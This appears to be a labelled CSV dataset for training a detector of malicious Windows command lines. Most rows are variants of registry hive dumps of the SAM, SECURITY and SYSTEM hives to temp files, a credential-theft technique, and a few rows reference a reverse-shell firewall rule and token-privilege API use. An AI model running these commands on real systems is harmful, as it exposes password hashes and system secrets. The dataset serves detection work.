text,label
"powershell -nop -c ""reg save hklm\security c:\temp\btli05eo.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\uby2eldo.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\m70ziskn.dat""",1
reg save hklm\system c:\windows\temp\nxsjf2x0.save,1
reg export hklm\system c:\windows\temp\kvs7mtr3.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\3e5c5u4z.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\xzn46ouv.dat""",1
reg export hklm\security c:\windows\temp\tyaqlmqn.save,1
reg   export   hklm\sam   c:\windows\temp\5bvq78vt.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\wb97tqmn.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\mvvpwgek.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ccjd008z.dat""",1
reg save hklm\security c:\windows\temp\k7i4rgg1.save,1
reg export hklm\security c:\windows\temp\35er8yrx.save,1
reg save hklm\system c:\windows\temp\2pbuavt6.save,1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\sam c:\temp\uhjjdftg.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\llx2t2ko.dat""",1
reg export hklm\sam c:\windows\temp\7pjxrri1.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\r8fjswwh.dat""",1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\rvwlus20.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\w2knexgp.dat""",1
reg save hklm\sam c:\windows\temp\lq69jyc1.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\49vggv2l.dat""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\w1gkt0xm.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\3uzylnyh.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\okkcjk5g.dat""",1
reg export hklm\system c:\windows\temp\32fpvr8d.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\99ymb6k1.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\9r4sn84l.dat""",1
reg export hklm\security c:\windows\temp\rvtysu2m.save,1
reg save hklm\sam c:\windows\temp\yz8s4pmp.save,1
reg export hklm\security c:\windows\temp\x54ou8mb.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\m6bn2ly7.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\1i6lw3rj.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\21qffq1v.dat""",1
reg export hklm\sam c:\windows\temp\yove6ykk.save,1
reg save hklm\sam c:\windows\temp\c1kizr3s.save,1
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\bxkt37hb.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\uwylbdzu.dat""",1
reg save hklm\security c:\windows\temp\cz8xvkut.save,1
reg   save   hklm\system   c:\windows\temp\q05xb79b.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\ce3jdjws.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\2ajss6ro.dat""",1
reg export hklm\sam c:\windows\temp\dlkfzsvt.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\wdenqr7l.dat""",1
reg save hklm\sam c:\windows\temp\a5waw3af.save,1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\0k3gr1ll.dat""""",1
reg export hklm\security c:\windows\temp\l8rxk0te.save,1
reg export hklm\security c:\windows\temp\v820ikyc.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\dadchl5q.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\sam c:\temp\8uj1hoxw.dat""""",1
reg save hklm\security c:\windows\temp\1i0bgsfs.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ztxlxuzj.dat""",1
reg   save   hklm\sam   c:\windows\temp\78tnv5bq.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\71cmi458.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\7ppnmuel.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\nga9bp3b.dat""",1
reg export hklm\sam c:\windows\temp\fa66zjk5.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\dqgh2qei.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\6vt16hvs.dat""""",1
reg save hklm\sam c:\windows\temp\057o84d6.save,1
reg save hklm\system c:\windows\temp\f4dk89pu.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\jiztp5jv.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\8mlkjvli.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\zd9j1lr5.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\cfa2wu7b.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\sam c:\temp\nzhi97cl.dat""""",1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\pzqcsv21.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\je606tbf.dat""",1
reg   export   hklm\system   c:\windows\temp\fblie65f.save,1
reg save hklm\security c:\windows\temp\q3ouomm6.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\judsvd8l.dat""",1
reg export hklm\sam c:\windows\temp\b3731ngi.save,1
reg export hklm\security c:\windows\temp\7exso086.save,1
reg save hklm\sam c:\windows\temp\9m7nevq5.save,1
reg export hklm\sam c:\windows\temp\8dw380ha.save,1
reg export hklm\security c:\windows\temp\1b7tiijz.save,1
reg  export  hklm\system  c:\windows\temp\hf1in1g7.save,1
reg save hklm\sam c:\windows\temp\vpsmo56q.save,1
reg export hklm\security c:\windows\temp\gqw74p9v.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\76kr0lmw.dat""",1
reg export hklm\sam c:\windows\temp\8q291mwt.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\xzs09b1e.dat""""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\2sjvjam9.dat""""",1
reg export hklm\system c:\windows\temp\6kesdeli.save,1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\kj4ffmhz.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\njza2jfr.dat""",1
reg save hklm\system c:\windows\temp\fjqr539t.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\h19ien8i.dat""",1
reg export hklm\system c:\windows\temp\nq1c8usw.save,1
reg save hklm\security c:\windows\temp\ctftsjqx.save,1
reg save hklm\security c:\windows\temp\l8ixe5rl.save,1
reg save hklm\system c:\windows\temp\hbpmqs5z.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg export hklm\system c:\windows\temp\kli3p5dw.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\6lmmuwnc.dat""",1
reg save hklm\security c:\windows\temp\qh25rd8s.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)""",3
reg save hklm\sam c:\windows\temp\xxzeprqt.save,1
reg save hklm\system c:\windows\temp\2hx2s28b.save,1
reg export hklm\sam c:\windows\temp\kz83af9b.save,1
reg save hklm\security c:\windows\temp\ojxrv80k.save,1
reg  save  hklm\sam  c:\windows\temp\drbpbvga.save,1
reg export hklm\sam c:\windows\temp\f1u0e7x0.save,1
reg save hklm\sam c:\windows\temp\w2h1t0yu.save,1
reg export hklm\system c:\windows\temp\qxmyjsxl.save,1
reg  save  hklm\sam  c:\windows\temp\kno8c7jx.save,1
reg   export   hklm\security   c:\windows\temp\e3p2pv9t.save,1
reg export hklm\sam c:\windows\temp\dmc7szlo.save,1
reg export hklm\system c:\windows\temp\54vj265c.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\fkgnw6oh.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\tnc7aqvx.dat""",1
reg export hklm\sam c:\windows\temp\l801juwp.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\9l3p7mxo.dat""",1
reg   export   hklm\security   c:\windows\temp\jz3cyulw.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ms50gds5.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\in6tlk9t.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\jn2ss0pw.dat""""",1
reg save hklm\sam c:\windows\temp\t8gsrtxp.save,1
"cmd.exe /c ""get-help  adjusttokenprivileges  -full""",0
"cmd.exe /c ""reg export hklm\sam c:\temp\hrr7igy2.dat""",1
reg export hklm\system c:\windows\temp\bljdcag9.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\sno462sy.dat""",1
reg save hklm\sam c:\windows\temp\ifslzv7h.save,1
"cmd.exe /c ""node  server.js  --port  3000""",0
"cmd.exe /c ""reg save hklm\sam c:\temp\mczd8rlt.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\8fv55n43.dat""",1
reg save hklm\system c:\windows\temp\b48d84ic.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\mb0vdn6n.dat""",1
reg export hklm\system c:\windows\temp\46ug66n6.save,1
reg save hklm\security c:\windows\temp\rjjhn51j.save,1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\352h67tl.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\q1vo0430.dat""",1
reg save hklm\system c:\windows\temp\h66ocdbl.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\pf9cao0v.dat""",1
reg export hklm\system c:\windows\temp\iibhudns.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\9yaz2zv9.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ngfok767.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\u3hpkhgf.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\pbjz7cnz.dat""",1
reg export hklm\security c:\windows\temp\3yj69wu3.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\61qmbxn8.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\8j4dw94q.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\aqhpsv4y.dat""",1
reg export hklm\system c:\windows\temp\f52u9qhz.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\q7aqquvy.dat""",1
reg export hklm\system c:\windows\temp\ysbcuw1t.save,1
reg save hklm\sam c:\windows\temp\tb2n33mg.save,1
reg save hklm\sam c:\windows\temp\vz5rqnmu.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\2tcqn8ft.dat""",1
reg export hklm\security c:\windows\temp\ln061vcs.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\1ml7geqo.dat""",1
reg save hklm\security c:\windows\temp\8mfbbcpp.save,1
reg save hklm\sam c:\windows\temp\7phzp63p.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\p7unpffx.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\pdfr07ah.dat""",1
reg save hklm\security c:\windows\temp\5gk1fua4.save,1
reg export hklm\security c:\windows\temp\k6d2phxe.save,1
reg export hklm\system c:\windows\temp\cd2wq86b.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\6kmwriil.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ypbcvey4.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\h6h4lbwf.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\3k8wuffj.dat""",1
reg export hklm\sam c:\windows\temp\c3b59008.save,1
reg export hklm\sam c:\windows\temp\vfj7pfck.save,1
reg save hklm\sam c:\windows\temp\rjgdqexg.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\vqcffw2o.dat""",1
reg save hklm\security c:\windows\temp\andm1d9f.save,1
reg save hklm\system c:\windows\temp\aeysz0my.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\l0y5hr5o.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\15rl448d.dat""",1
reg   export   hklm\system   c:\windows\temp\nq9h0rr4.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\svdmw1h8.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\lliel4xn.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ge8k75vf.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\2cl4fwf4.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\rmmxhk8x.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\r6apovih.dat""""",1
reg export hklm\system c:\windows\temp\svn9prg1.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\gl1tjf81.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\qdsa8cmb.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\55kje9pw.dat""",1
reg export hklm\security c:\windows\temp\8zbqzyka.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\truevvgu.dat""",1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\5k8hsppo.save""",1
reg export hklm\system c:\windows\temp\u0wirucv.save,1
reg save hklm\sam c:\windows\temp\6hwhflmy.save,1
reg save hklm\system c:\windows\temp\9lq0wgpw.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\bzblk4kr.dat""",1
reg export hklm\security c:\windows\temp\apamc9qt.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\y9sktaeq.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\ce5gg2xy.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\yy8e8dus.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\twwww2jd.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\t3aqns89.dat""",1
reg export hklm\system c:\windows\temp\wzqq3hpt.save,1
reg   save   hklm\security   c:\windows\temp\ellle504.save,1
reg save hklm\system c:\windows\temp\2kez4goc.save,1
reg save hklm\sam c:\windows\temp\z1zgfrdb.save,1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\iicpwlhg.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\cle6o1jb.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\a7c1as51.dat""",1
reg save hklm\system c:\windows\temp\h4rpzcn1.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\0qbdl257.dat""",1
reg save hklm\sam c:\windows\temp\j6vdrgro.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\x1qyn920.dat""",1
reg save hklm\security c:\windows\temp\ly6xu3a5.save,1
reg save hklm\system c:\windows\temp\3048t3d2.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\e7725kdi.dat""",1
reg export hklm\security c:\windows\temp\ept1nv1i.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\3dnbggaf.dat""",1
reg export hklm\system c:\windows\temp\7r4jy264.save,1
reg save hklm\sam c:\windows\temp\ks1ekk6l.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\u080zwjo.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\b3hvop9r.dat""",1
reg save hklm\sam c:\windows\temp\3jyckrwk.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\yi1heahq.dat""",1
reg save hklm\sam c:\windows\temp\9veao8me.save,1
reg save hklm\sam c:\windows\temp\vg01d8s1.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\dfdkwjc0.dat""",1
reg save hklm\security c:\windows\temp\9a4yhjja.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\fhxo6e4y.dat""",1
reg save hklm\sam c:\windows\temp\yvsu96ey.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\51gajvkk.dat""",1
reg save hklm\sam c:\windows\temp\7ca5xi2j.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\nomtwo38.dat""",1
reg export hklm\sam c:\windows\temp\c6so6zil.save,1
reg save hklm\sam c:\windows\temp\1q3o203i.save,1
reg export hklm\system c:\windows\temp\5obh70r4.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\yab7ysok.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\q6ekfxgz.dat""",1
reg save hklm\security c:\windows\temp\dotv5p3n.save,1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\security c:\temp\bq57m8je.dat""""",1
reg export hklm\sam c:\windows\temp\22t9wd78.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\8kz65qjv.dat""""",1
reg save hklm\sam c:\windows\temp\jid256gl.save,1
reg export hklm\sam c:\windows\temp\uke05a5o.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\kps2apu0.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\3qgnk9b5.dat""",1
reg  export  hklm\security  c:\windows\temp\gc0eegx6.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\o1zso6jk.dat""",1
reg export hklm\sam c:\windows\temp\emnnu403.save,1
reg  export  hklm\security  c:\windows\temp\k0c5785a.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ve1zne35.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\s2wprmcp.dat""",1
reg export hklm\security c:\windows\temp\naxtyb2s.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\ds90xfdi.dat""",1
reg export hklm\system c:\windows\temp\773ue3kc.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ooiyr6dk.dat""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\8ygk2t22.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\oudtzyq0.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\z1agqdro.dat""",1
reg export hklm\security c:\windows\temp\neu32djj.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\s3y3fq08.dat""",1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\lk0wog5u.save""",1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\abnwxn7z.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\o947ec2z.dat""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\sb165us5.dat""",1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\rgml3m4y.save""",1
reg export hklm\sam c:\windows\temp\9iek64p9.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\35eaic0b.dat""",1
reg save hklm\system c:\windows\temp\0fd668dx.save,1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\kwftekmh.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\qbtxpo9g.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\2azx664w.dat""",1
reg export hklm\security c:\windows\temp\uor9drfk.save,1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\47knjf7j.save""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\jug8thgz.dat""",1
reg   export   hklm\system   c:\windows\temp\f9atmn65.save,1
reg save hklm\sam c:\windows\temp\vvwcysbs.save,1
reg export hklm\security c:\windows\temp\3ieab4l1.save,1
reg export hklm\sam c:\windows\temp\w9tuhk6v.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\6d0jt68l.save""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\eictk9zo.dat""""",1
reg export hklm\security c:\windows\temp\8f593r0s.save,1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\n70jsx78.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\a0fxm455.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\yh0hqoa3.dat""""",1
reg save hklm\system c:\windows\temp\d3dvqq61.save,1
reg export hklm\system c:\windows\temp\6sad2ido.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\wyjxneuu.dat""""",1
reg save hklm\system c:\windows\temp\n6a90ud8.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\g28jw5zp.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\gq50gjht.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\rbix6s8m.dat""",1
reg save hklm\sam c:\windows\temp\uxmubpgy.save,1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\rk5vxre6.save""",1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\fx9pe7ex.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\nbzy77w1.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\5eelcin2.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\8cociecx.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\fu4fvgfz.dat""",1
reg save hklm\security c:\windows\temp\58ya73js.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ug9spd6z.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\9qupft81.dat""""",1
reg   export   hklm\system   c:\windows\temp\e8314bvb.save,1
reg save hklm\security c:\windows\temp\11edfmed.save,1
reg export hklm\security c:\windows\temp\hi2cxp07.save,1
reg export hklm\system c:\windows\temp\l3sr4h7a.save,1
reg save hklm\security c:\windows\temp\4xx2ltya.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\mc09452c.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\ymnxgs4t.dat""",1
reg export hklm\system c:\windows\temp\8hz53drg.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\d303je1l.dat""",1
reg   save   hklm\system   c:\windows\temp\sjs8mkm3.save,1
reg save hklm\system c:\windows\temp\5xxg539f.save,1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\vmpeqfjd.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\0sfxje0a.dat""",1
reg save hklm\security c:\windows\temp\o2hj2rob.save,1
reg save hklm\sam c:\windows\temp\tsrve4yq.save,1
reg save hklm\security c:\windows\temp\gndxlzpc.save,1
reg export hklm\security c:\windows\temp\d4shlr1s.save,1
reg save hklm\sam c:\windows\temp\0u4m3fel.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\e0ywsczy.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\b26bh9u8.dat""",1
reg export hklm\security c:\windows\temp\ofj6iqyi.save,1
reg save hklm\system c:\windows\temp\nkrubi0w.save,1
reg save hklm\security c:\windows\temp\myflovgk.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\syjttk7e.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\4gaf0sr6.dat""",1
reg export hklm\system c:\windows\temp\8b698c97.save,1
reg save hklm\security c:\windows\temp\etxfkk2z.save,1
reg save hklm\sam c:\windows\temp\mbs8jgol.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\f0zo61gi.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\dycts1l7.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\u5imkbnh.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ltx1gevd.dat""",1
reg export hklm\security c:\windows\temp\58o5mb4f.save,1
reg save hklm\system c:\windows\temp\0q78m8nn.save,1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\yhttch2r.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\759rtrtr.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\l7r8t3ze.dat""",1
reg export hklm\security c:\windows\temp\j5zq8tfa.save,1
reg export hklm\sam c:\windows\temp\7vtwljbv.save,1
reg save hklm\security c:\windows\temp\15gmkweu.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\l6x9zwfi.dat""",1
reg export hklm\sam c:\windows\temp\sibzuk1e.save,1
reg export hklm\sam c:\windows\temp\zi943a2g.save,1
reg export hklm\system c:\windows\temp\jkzgoyi8.save,1
reg save hklm\system c:\windows\temp\g1d9y66j.save,1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\3beepg30.dat""""",1
reg save hklm\system c:\windows\temp\28yot3jb.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\jlpw2snq.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\bjbsiorz.dat""",1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\oeh05yye.save""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\xjbziquk.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\4zqi6zdd.dat""",1
reg save hklm\sam c:\windows\temp\hxdcbn1k.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\r2qnb6ay.dat""",1
reg export hklm\sam c:\windows\temp\u89usnti.save,1
reg export hklm\sam c:\windows\temp\ya7mm56e.save,1
reg export hklm\security c:\windows\temp\u3csxi8m.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ld69us5g.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\vkix84yg.dat""",1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\y4bl3sfj.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\d382oxrc.dat""",1
reg save hklm\system c:\windows\temp\evqfo1o0.save,1
reg export hklm\sam c:\windows\temp\80egfcqz.save,1
reg save hklm\sam c:\windows\temp\ksa8i2ei.save,1
reg export hklm\system c:\windows\temp\oor32iw7.save,1
reg save hklm\security c:\windows\temp\trs11nvl.save,1
reg save hklm\security c:\windows\temp\kk04vjtu.save,1
reg save hklm\system c:\windows\temp\5pu0y1xf.save,1
reg export hklm\sam c:\windows\temp\xgeqsgu8.save,1
reg export hklm\sam c:\windows\temp\r1bh746q.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\nc67gf74.dat""",1
reg save hklm\sam c:\windows\temp\r4hlc2ri.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\bwc3p9cy.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\7d7d387t.dat""",1
reg export hklm\sam c:\windows\temp\flqwycp7.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\0cpl3v0e.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\f1lobm5a.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\5znrkxbz.dat""""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\3c5ys500.dat""",1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\qpks8usr.save""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\v7068fwl.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\2ngyym2p.dat""",1
reg save hklm\system c:\windows\temp\qz0wjzsz.save,1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\leyqbn3k.dat""",1
reg save hklm\system c:\windows\temp\f33gti2y.save,1
reg  export  hklm\security  c:\windows\temp\x57atzba.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\abdxl36y.dat""",1
reg save hklm\system c:\windows\temp\bl5qzn7m.save,1
reg export hklm\sam c:\windows\temp\qvor0xgk.save,1
reg export hklm\system c:\windows\temp\zlxha6y0.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\oygirx8b.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\pm1k4lh1.dat""",1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\9prpnjqk.dat""",1
